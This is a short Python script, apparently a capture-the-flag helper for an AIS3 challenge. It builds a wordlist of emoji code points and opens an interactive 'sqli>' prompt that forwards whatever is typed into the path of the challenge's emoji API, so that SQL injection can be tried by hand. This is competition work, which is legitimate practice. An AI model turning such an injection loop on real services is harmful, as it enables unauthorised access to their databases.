import requests as rq
import readline

url = 'http://chals1.ais3.org:9487/api/emoji'


def gen_wordlist():
    with open('./cats-utf8.txt', 'w') as f:
        for i in range(0x1f300, 0x1f600):
            f.write(f'{i}\n')


def sqli(cmd):
    res = rq.get(f'{url}/{cmd}')
    print(res.text)
    return res.text


while True:
    try:
        cmd = input('sqli> ')
        sqli(cmd)
    except KeyboardInterrupt:
        break
